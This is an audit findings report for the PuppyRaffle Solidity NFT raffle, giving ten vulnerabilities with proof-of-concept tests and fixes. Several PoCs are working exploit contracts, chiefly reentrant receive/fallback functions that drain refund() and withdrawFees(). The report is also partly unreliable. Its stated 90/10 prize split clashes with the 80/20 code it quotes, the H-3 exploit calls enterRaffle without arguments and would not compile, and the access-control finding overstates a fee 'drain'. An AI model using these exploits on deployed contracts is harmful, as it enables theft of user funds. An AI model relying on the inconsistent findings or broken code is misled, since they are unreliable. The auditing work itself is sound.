# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle Protocol
PuppyRaffle is an on-chain raffle game that rewards participants with unique dog-themed ERC-721 NFTs. It combines OpenZeppelin’s ERC721 token logic with a simple lottery flow:

1. Setup
   * Deployer defines entrance fee, fee recipient, and raffle duration.
   * Contract inherits Ownable (admin controls) and ERC721 (NFT minting).

2. Entering
   * `enterRaffle(address[] players)` lets anyone register one or multiple wallet addresses by paying `entranceFee` per entry.
   * Duplicate or zero addresses are rejected.
   * Entries are stored in an array; helper `getActivePlayerIndex` aids refund look-ups.

3. Exiting Early
   * Before a winner is drawn, a player can call `refund(index)` to reclaim their fee, removing their entry.

4. Winner Selection
   * After `raffleDuration`, `selectWinner()` may be called by anyone.
   * A pseudo-random index (blockhash, timestamp, supply) chooses the winner.
   * 90% of the pot is sent to the winner, 10% to the fee address.
   * A new NFT with on-chain JSON & Base64-encoded metadata is minted to the champion, featuring a rarity tier chosen at mint.
   * Player list resets for the next round.

5. Admin Functions
   * Owner can change the fee address and withdraw accumulated fees when no raffle is active.

The result is a self-contained, gas-efficient raffle that transparently handles funds, refunds, and NFT prize distribution on Ethereum.
## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::selectWinner
[H-3]. Reentrancy issue in PuppyRaffle::selectWinner, withdrawFees
[H-4]. Reentrancy issue in PuppyRaffle::refund
## Medium Risk Findings
[M-1]. DOS issue in PuppyRaffle::enterRaffle
[M-2]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-4]. Access Control issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Storage Layout issue in PuppyRaffle::refund
## Info Risk Findings
[I-1]. Pragma issue in PuppyRaffle::NA


### Number of Findings
- H: 4
- M: 4
- L: 1
- I: 1



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The selectWinner function uses predictable on-chain data for randomness generation. The random number is generated using:

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

All these values (msg.sender, block.timestamp, block.difficulty) are known or predictable by miners and sophisticated attackers, making the randomness vulnerable to manipulation.

## Impact
Miners can manipulate block.difficulty and block.timestamp to influence the random outcome. Attackers can predict the winner and potentially manipulate the raffle results, leading to unfair distribution of prizes and loss of trust in the protocol.

## Proof of Concept
1. A miner or attacker observes the current players array and calculates potential outcomes
2. They can manipulate block.timestamp within reasonable bounds or influence block.difficulty
3. By controlling msg.sender and knowing the other parameters, they can predict or influence the winner selection
4. This allows them to ensure they or their chosen address wins the raffle

## Proof of Code
```solidity
function testPredictableRandomness() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    
    // Simulate attacker predicting the outcome
    uint256 predictedWinner = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
    
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner();
    
    // The winner can be predicted based on known parameters
}
```

## Suggested Mitigation
Use a verifiable random function (VRF) like Chainlink VRF for secure randomness:

```solidity
import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";

contract PuppyRaffle is VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    uint256 public randomResult;
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        requestRandomness(keyHash, fee);
    }
    
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        uint256 winnerIndex = randomness % players.length;
        // Continue with winner selection logic
    }
}
```

## [H-2]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The selectWinner function is vulnerable to reentrancy attacks when sending the prize pool to the winner. The function uses a low-level call without proper reentrancy protection:

```solidity
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

The state changes (like resetting players array and minting NFT) happen after the external call, allowing a malicious winner contract to re-enter and potentially manipulate the contract state.

## Impact
A malicious winner contract could re-enter the selectWinner function during the prize transfer, potentially causing unexpected behavior, double spending, or state manipulation before the raffle is properly concluded.

## Proof of Concept
1. Attacker deploys a malicious contract that enters the raffle
2. When selectWinner is called and the attacker's contract is chosen as winner
3. During the prize transfer, the malicious contract's receive/fallback function calls back into selectWinner
4. This could lead to unexpected state changes or multiple prize distributions

## Proof of Code
```solidity
contract MaliciousWinner {
    PuppyRaffle puppyRaffle;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    receive() external payable {
        // Reentrancy attack during prize distribution
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.selectWinner();
        }
    }
}

function testReentrancyAttack() public {
    MaliciousWinner attacker = new MaliciousWinner(puppyRaffle);
    
    address[] memory players = new address[](4);
    players[0] = address(attacker);
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner(); // This could trigger reentrancy
}
```

## Suggested Mitigation
Implement the checks-effects-interactions pattern and use reentrancy guards:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    function selectWinner() external nonReentrant {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        // Effects: Update state first
        address winner = players[winnerIndex];
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        
        // Interactions: External calls last
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        
        _safeMint(winner, tokenId);
    }
}
```

## [H-3]. Reentrancy issue in PuppyRaffle::selectWinner, withdrawFees

## Description
The `selectWinner` and `withdrawFees` functions are susceptible to reentrancy vulnerabilities since they rely on external calls which may result in callbacks.

## Impact
An attacker could exploit the reentrancy to repeatedly withdraw funds or manipulate state changes leading to potential financial loss.

## Proof of Concept
An attacker could deploy a malicious contract that has a fallback function to reenter `withdrawFees` or `selectWinner` during the external call phase.

## Proof of Code
contract ReentrantAttack {
    PuppyRaffle target;
    constructor(address _target) public { target = PuppyRaffle(_target); }
    fallback() external payable {
        if (address(target).balance > 0) {
            target.withdrawFees();
        }
    }
    function attack() public {
        target.enterRaffle{value: 1 ether}();
        target.withdrawFees();
    }
}

## Suggested Mitigation
Use the Checks-Effects-Interactions pattern to ensure state changes occur before external calls, or employ reentrancy guard mechanisms.

## [H-4]. Reentrancy issue in PuppyRaffle::refund

## Description
`refund(uint256 playerIndex)` sends ETH to `msg.sender` before the player’s slot is cleared, enabling re-entrancy.  An attacker contract can re-enter `refund()` in its fallback while the slot is still non-zero and drain the contract multiple times.

```solidity
Address.sendValue(payable(msg.sender), entranceFee); // external call with all gas
players[playerIndex] = address(0);                  // state update AFTER call
```

## Impact
One attacker can withdraw the entrance fee many times, stealing all fees and preventing honest players from refunding.

## Proof of Concept
1. Attacker joins raffle once.
2. Attacker calls `refund(i)` from a contract whose receive() calls `raffle.refund(i)` again.
3. First call sends ETH, fallback re-enters because `players[i]` is still attacker’s address.
4. Loop drains contract.

## Proof of Code
contract Malicious {
    PuppyRaffle raffle; uint idx; uint counter;
    constructor(PuppyRaffle _r, uint _idx) payable { raffle=_r; idx=_idx; }
    receive() external payable { if(counter<5){ counter++; raffle.refund(idx); } }
    function attack() external { raffle.refund(idx); }
}

contract TestReentrancy is DSTest {
    function testDrain() public {
        PuppyRaffle r = new PuppyRaffle(1 ether, address(0xAAA), 1);
        address[] memory p = new address[](1); p[0]=address(this);
        r.enterRaffle{value:1 ether}(p); // dummy
        p[0]=address(new Malicious{value:1 ether}(r,1));
        r.enterRaffle{value:1 ether}(p);
        uint balBefore = address(r).balance;
        Malicious(p[0]).attack();
        assertGt(address(p[0]).balance, 1 ether); // received more than paid
        assertLt(address(r).balance, balBefore - 1 ether);
    }
}

## Suggested Mitigation
Follow checks-effects-interactions, or use ReentrancyGuard:
```solidity
function refund(uint256 playerIndex) public nonReentrant {
    address player = players[playerIndex];
    require(player == msg.sender, "Only player");
    require(player != address(0), "Inactive");
    players[playerIndex] = address(0);      // effects first
    Address.sendValue(payable(msg.sender), entranceFee); // interaction after state update
}
```



# Medium Risk Findings

## [M-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The enterRaffle function contains a nested loop that checks for duplicate players with O(n²) complexity. For each new player added, it loops through all existing players to check for duplicates. This creates a denial of service vulnerability where an attacker can make the function prohibitively expensive to call by filling the players array with many addresses. The vulnerable code is:

```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

## Impact
As the players array grows, the gas cost increases quadratically, eventually making the function too expensive to call. This can prevent new players from entering the raffle and effectively break the protocol's core functionality.

## Proof of Concept
1. Deploy the PuppyRaffle contract
2. Have multiple users call enterRaffle with different addresses to fill the players array
3. As the array grows (e.g., 100+ players), subsequent calls to enterRaffle will require increasingly more gas
4. Eventually, the gas required will exceed block gas limits, making the function uncallable

## Proof of Code
```solidity
function testDenialOfService() public {
    vm.txGasPrice(1);
    
    // Fill players array with many addresses
    uint256 playersNum = 100;
    address[] memory players = new address[](1);
    
    for (uint256 i = 0; i < playersNum; i++) {
        players[0] = address(i);
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        uint256 gasUsed = gasStart - gasleft();
        console.log("Gas used for player", i, ":", gasUsed);
    }
    
    // Gas usage should increase significantly
}
```

## Suggested Mitigation
Use a mapping to track duplicate players instead of nested loops:

```solidity
mapping(address => bool) public addressToEntered;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(!addressToEntered[newPlayers[i]], "PuppyRaffle: Duplicate player");
        players.push(newPlayers[i]);
        addressToEntered[newPlayers[i]] = true;
    }
    
    emit RaffleEnter(newPlayers);
}
```

## [M-2]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The contract uses integer arithmetic operations without proper overflow/underflow protection. While Solidity 0.7.6 doesn't have built-in overflow protection, the contract performs several arithmetic operations that could potentially overflow:

```solidity
totalFees = totalFees + uint64(fee);
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
```

The totalFees variable is uint64 which has a maximum value of 18,446,744,073,709,551,615 wei (about 18.4 ETH), making overflow possible with large fee accumulations.

## Impact
Integer overflow in totalFees could cause the fee tracking to wrap around to zero, leading to incorrect fee calculations and potential loss of funds. This could also cause the withdrawFees function to fail or behave unexpectedly.

## Proof of Concept
1. Run multiple raffles with high entrance fees
2. Accumulate fees until totalFees approaches the uint64 maximum
3. When totalFees overflows, it wraps to a small number
4. This causes incorrect fee tracking and potential issues with withdrawFees

## Proof of Code
```solidity
function testIntegerOverflow() public {
    // Set high entrance fee to cause faster overflow
    uint256 highFee = 1 ether;
    PuppyRaffle highFeeRaffle = new PuppyRaffle(highFee, feeAddress, duration);
    
    // Simulate many raffles to accumulate fees
    for (uint256 i = 0; i < 100; i++) {
        address[] memory players = new address[](4);
        players[0] = address(uint160(i * 4 + 1));
        players[1] = address(uint160(i * 4 + 2));
        players[2] = address(uint160(i * 4 + 3));
        players[3] = address(uint160(i * 4 + 4));
        
        highFeeRaffle.enterRaffle{value: highFee * 4}(players);
        vm.warp(block.timestamp + duration + 1);
        highFeeRaffle.selectWinner();
    }
    
    // totalFees might have overflowed
}
```

## Suggested Mitigation
Use SafeMath library for arithmetic operations and consider using uint256 for totalFees:

```solidity
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;
    
    uint256 public totalFees; // Changed from uint64 to uint256
    
    function selectWinner() external {
        // Use SafeMath for arithmetic operations
        uint256 totalAmountCollected = players.length.mul(entranceFee);
        uint256 prizePool = totalAmountCollected.mul(80).div(100);
        uint256 fee = totalAmountCollected.mul(20).div(100);
        totalFees = totalFees.add(fee);
        
        // Rest of the function...
    }
}
```

## [M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The withdrawFees function has a strict balance check that can be bypassed if the contract receives unexpected ETH, causing a denial of service:

```solidity
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

If someone sends ETH directly to the contract (via selfdestruct or other means), the balance will be higher than totalFees, making this function permanently uncallable.

## Impact
The contract owner will be unable to withdraw accumulated fees if the contract receives unexpected ETH, effectively locking the fees permanently. This breaks a core functionality of the protocol.

## Proof of Concept
1. Contract accumulates fees through normal raffle operations
2. An attacker or user accidentally sends ETH directly to the contract
3. Now address(this).balance > totalFees
4. withdrawFees function becomes permanently uncallable due to the strict equality check

## Proof of Code
```solidity
function testUnexpectedEthDenialOfService() public {
    // Normal raffle operation to accumulate fees
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner();
    
    // Someone sends unexpected ETH
    vm.deal(address(puppyRaffle), address(puppyRaffle).balance + 1 ether);
    
    // Now withdrawFees will fail
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```

## Suggested Mitigation
Change the strict equality check to allow for unexpected ETH:

```solidity
function withdrawFees() external {
    require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Insufficient balance for fees");
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-4]. Access Control issue in PuppyRaffle::selectWinner

## Description
The contract contains several mismatches between function visibility specified and actual implementation. Some functions are marked as external but could be internal, and vice versa. More importantly, the contract lacks proper access control on critical functions, allowing anyone to call selectWinner and withdrawFees without restrictions.

Vulnerable functions:
```solidity
function selectWinner() external // Should have access control
function withdrawFees() external // Should have access control  
function getActivePlayerIndex(address player) external view returns (uint256) // Could be external
```

## Impact
Anyone can call selectWinner at any time after the raffle duration, potentially front-running the intended caller or manipulating timing. Anyone can call withdrawFees, potentially draining fees meant for the fee address. This lacks proper access control for critical protocol functions.

## Proof of Concept
1. Deploy PuppyRaffle contract
2. Add players and wait for raffle duration to pass
3. Any external account can call selectWinner, not just authorized parties
4. Any external account can call withdrawFees when conditions are met
5. Attackers could time these calls for their advantage or drain protocol funds

## Proof of Code
contract TestAccessControl {
    PuppyRaffle puppyRaffle;
    address attacker = address(0x666);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
    }
    
    function testAnyoneCanCallSelectWinner() public {
        // Add minimum players
        address[] memory players = new address[](4);
        for (uint i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        vm.warp(block.timestamp + 1 days + 1);
        
        // Attacker can call selectWinner
        vm.prank(attacker);
        puppyRaffle.selectWinner();
        
        // Verify winner was selected
        assert(puppyRaffle.previousWinner() != address(0));
    }
    
    function testAnyoneCanWithdrawFees() public {
        // First run a raffle to generate fees
        address[] memory players = new address[](4);
        for (uint i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        vm.warp(block.timestamp + 1 days + 1);
        puppyRaffle.selectWinner();
        
        // Now attacker can withdraw fees
        vm.prank(attacker);
        puppyRaffle.withdrawFees();
        
        assert(puppyRaffle.totalFees() == 0);
    }
}

## Suggested Mitigation
Add proper access control to critical functions:

```solidity
contract PuppyRaffle is ERC721, Ownable {
    
    // Add a role for raffle operators
    mapping(address => bool) public raffleOperators;
    
    modifier onlyOperatorOrOwner() {
        require(raffleOperators[msg.sender] || msg.sender == owner(), "PuppyRaffle: Not authorized");
        _;
    }
    
    function addRaffleOperator(address operator) external onlyOwner {
        raffleOperators[operator] = true;
    }
    
    function removeRaffleOperator(address operator) external onlyOwner {
        raffleOperators[operator] = false;
    }
    
    function selectWinner() external onlyOperatorOrOwner {
        // existing implementation
    }
    
    function withdrawFees() external onlyOwner {
        // existing implementation  
    }
}
```

Alternatively, for a more decentralized approach, allow anyone to call selectWinner but add proper timing controls:

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    require(block.timestamp <= raffleStartTime + raffleDuration + 1 hours, "PuppyRaffle: Selection window expired");
    // rest of implementation
}
```



# Low Risk Findings

## [L-1]. Storage Layout issue in PuppyRaffle::refund

## Description
The refund function allows players to get refunds but doesn't update the duplicate checking mechanism. If the contract is modified to use a mapping for duplicate prevention, the refund function would need to update that mapping. Currently, it only sets the player's address to address(0):

```solidity
players[playerIndex] = address(0);
```

This creates inconsistency in player tracking and could allow the same address to enter again even though they haven't been properly removed.

## Impact
Inconsistent player state management could lead to logical errors, allow duplicate entries after refunds, or cause issues with player counting and raffle mechanics.

## Proof of Concept
1. Player enters raffle and is added to players array
2. Player requests refund, their entry is set to address(0) but not removed
3. If duplicate checking uses a mapping, it's not updated
4. Player could potentially enter again or cause counting issues
5. The players array contains address(0) entries affecting length calculations

## Proof of Code
```solidity
function testRefundStorageInconsistency() public {
    address[] memory players = new address[](1);
    players[0] = playerOne;
    
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    
    uint256 playerIndex = puppyRaffle.getActivePlayerIndex(playerOne);
    
    vm.prank(playerOne);
    puppyRaffle.refund(playerIndex);
    
    // Player array still has same length but contains address(0)
    // This could cause issues with winner selection and duplicate checking
}
```

## Suggested Mitigation
Properly manage player state by removing players from tracking mechanisms:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Remove from players array by swapping with last element
    players[playerIndex] = players[players.length - 1];
    players.pop();
    
    // If using mapping for duplicates, update it
    // addressToEntered[playerAddress] = false;
    
    payable(msg.sender).transfer(entranceFee);
    emit RaffleRefunded(playerAddress);
}
```



# Info Risk Findings

## [I-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses an outdated Solidity version (0.7.6) which lacks built-in overflow protection and other security improvements available in newer versions. The pragma statement allows for a range of versions:

```solidity
pragma solidity >=0.6.0 <0.9.0;
```

This broad range includes versions with known vulnerabilities and missing security features.

## Impact
Using outdated Solidity versions exposes the contract to known vulnerabilities, lacks automatic overflow protection, and misses important security improvements. The broad pragma range also introduces deployment inconsistencies.

## Proof of Concept
1. The contract is compiled with Solidity 0.7.6 which lacks automatic overflow/underflow protection
2. Arithmetic operations can silently overflow without reverting
3. Missing security features from newer versions leave the contract vulnerable
4. Different compiler versions in the allowed range may produce different bytecode

## Proof of Code
```solidity
// Current vulnerable pragma
pragma solidity >=0.6.0 <0.9.0;

// This allows compilation with versions that have known issues
// and lack security features like automatic overflow protection
```

## Suggested Mitigation
Update to a recent stable Solidity version with a locked pragma:

```solidity
pragma solidity 0.8.19;

// Or use a narrow range for the latest stable versions
pragma solidity ^0.8.19;

// This provides:
// - Automatic overflow/underflow protection
// - Better error handling
// - Security improvements
// - Consistent compilation results
```



